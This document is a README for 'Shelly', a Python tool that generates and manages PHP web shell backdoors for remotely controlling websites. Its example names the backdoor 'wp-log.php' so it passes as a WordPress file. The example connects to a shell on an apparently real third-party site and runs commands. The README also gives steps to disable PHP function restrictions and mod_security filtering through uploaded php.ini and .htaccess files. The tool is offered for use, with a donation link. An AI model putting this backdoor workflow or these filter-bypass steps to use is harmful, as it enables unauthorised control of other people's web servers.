
## Shelly | Simple Backdoor Manager with Python (based on weevely)

![Screenshoot](capture/capture-2.png)
<br>
Shelly is a simple tool that is written using Python, which functions to remote a website
<br>
### Instalation :

$ git clone https://github.com/tegal1337/Shelly <br>
$ cd Shelly <br>
$ python3 shell.py <br>

### Requirements :

<pre>
sudo pip install -r requirements.txt
</pre>

### Example :
<pre>

python3 shell.py -g wp-log -p tegal1337
   ______      ____
  / __/ / ___ / / __ __
 _\ \/ _ / -_/ / / // /
/___/_//_\__/_/_/\_, /
                /___/  v.1
--------------------------
Python shell - Tegal1337 |
Generate :
[+] ./backdoor.py -g "nama_shell" -p "password"
Connect Server :
[+] ./backdoor.py -u "url_shell" -p "password"

Backdoor berhasil dibuat dengan nama wp-log.php dan password tegal1337

dalpan@Tegal1337:~/Tools$ python3 shell.py -u "https://www.pamz3d.com/wp-log.php" -p tegal1337
/opt/lampp/htdocs/php-futsal$ id
uid=501(pamz3d) gid=501(pamz3d) groups=501(pamz3d)
</pre>
![Screenshoot](capture/capture.png)
![Screenshoot](capture/capture-3.png)

### Disable Function Bypass :
<ul>
   <li>look for the folder whose permissions 777 (rwx rwx rwx)</li>
   <li>Upload file php.ini </li>
</ul>
<pre>
safe_mode = OFF
disable_functions = NONE
</pre>
<ul>
   <li>And upload file .htaccess</li>
 </ul>
<pre>
<IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
</IfModule>
</pre>


### Artikel :
<ul>
   <li>https://tegalsec.org/meremote-sebuah-website-menggunakan-backdoor-python/</li>
</ul>

### Contact :
<ul>
  <li> Email : van@tegalsec.org</li>
</ul>

### Support our organization by giving donations

[![Foo](https://www.paypalobjects.com/en_US/i/btn/btn_donate_LG.gif)](https://paypal.me/dalpan)
